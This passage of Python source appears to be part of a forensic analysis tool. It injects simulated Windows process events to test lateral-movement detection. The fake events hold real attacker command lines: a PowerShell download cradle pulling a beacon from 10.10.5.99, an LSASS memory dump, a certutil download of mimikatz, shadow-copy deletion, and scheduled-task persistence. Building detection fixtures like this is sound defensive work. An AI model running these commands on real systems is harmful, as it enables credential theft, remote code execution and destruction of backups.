            "powershell.exe -ep bypass -c \"IEX(New-Object Net.WebClient).DownloadString('http://10.10.5.99/beacon.ps1')\""))

        # Credential dumping on DC01
        events.append(proc(f"{base}08:02:00Z", "DC01", "0x2000", "0x4000",
            "C:\\Windows\\System32\\cmd.exe",
            "C:\\Windows\\System32\\rundll32.exe",
            "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 624 C:\\temp\\lsass.dmp full",
            user="domain_admin", integrity="System"))

        # Certutil download
        events.append(proc(f"{base}08:05:00Z", "DC01", "0x2000", "0x4100",
            "C:\\Windows\\System32\\cmd.exe",
            "C:\\Windows\\System32\\certutil.exe",
            "certutil.exe -urlcache -split -f http://10.10.5.99/mimikatz.exe C:\\temp\\m.exe",
            user="domain_admin", integrity="High"))

        # Shadow copy deletion (pre-ransomware)
        events.append(proc(f"{base}09:00:00Z", "SQLSERVER", "0x2000", "0x5000",
            "C:\\Windows\\System32\\cmd.exe",
            "C:\\Windows\\System32\\vssadmin.exe",
            "vssadmin.exe delete shadows /all /quiet",
            user="domain_admin", integrity="High"))

        # WMI remote execution
        events.append(proc(f"{base}09:31:00Z", "DEVBOX", "0x004", "0x6000",
            "C:\\Windows\\System32\\svchost.exe",
            "C:\\Windows\\System32\\wbem\\wmiprvse.exe",
            "C:\\Windows\\System32\\wbem\\wmiprvse.exe", user="SYSTEM", integrity="System"))
        events.append(proc(f"{base}09:31:01Z", "DEVBOX", "0x6000", "0x6100",
            "C:\\Windows\\System32\\wbem\\wmiprvse.exe",
            "C:\\Windows\\System32\\cmd.exe",
            "cmd.exe /q /c cd 1>&2 && echo aaaa > \\\\DEVBOX\\pipe\\wmi"))

        # Scheduled task for persistence
        events.append(proc(f"{base}09:35:00Z", "DEVBOX", "0x2000", "0x6200",
            "C:\\Windows\\System32\\cmd.exe",
            "C:\\Windows\\System32\\schtasks.exe",
            "schtasks.exe /create /s DC01 /tn UpdateCheck /tr \"powershell.exe -w hidden -c IEX(...)\" /sc daily /st 02:00",
            user="domain_admin"))

        # Execution from temp
        events.append(proc(f"{base}10:00:00Z", "WORKSTATION-01", "0x1000", "0x7000",
            "C:\\Windows\\explorer.exe",
            "C:\\Users\\admin\\AppData\\Local\\Temp\\payload.exe",
            "C:\\Users\\admin\\AppData\\Local\\Temp\\payload.exe"))

        # Save as JSONL file
        data_dir = os.path.join(_active_case["case_dir"], "data")
        os.makedirs(data_dir, exist_ok=True)
        jsonl_path = os.path.join(data_dir, "simulated_security.jsonl")
        with open(jsonl_path, "w", encoding="utf-8") as jf:
            for ev_item in events:
                jf.write(json.dumps(ev_item, default=str) + "\n")

        conn.execute("UPDATE artifacts SET file_path = ? WHERE id = ?", (jsonl_path, artifact_id))
        conn.commit()
        update_artifact_status(conn, artifact_id, "parsed", len(events))

        print(f"[SIGIL] Test LM: Injected {len(events)} simulated events")
        return {"status": "success", "message": f"Injected {len(events)} events. Go to Lateral Movement tab and click Analyze.", "event_count": len(events)}
    except Exception as e:
        import traceback
        return {"status": "error", "message": str(e), "trace": traceback.format_exc()}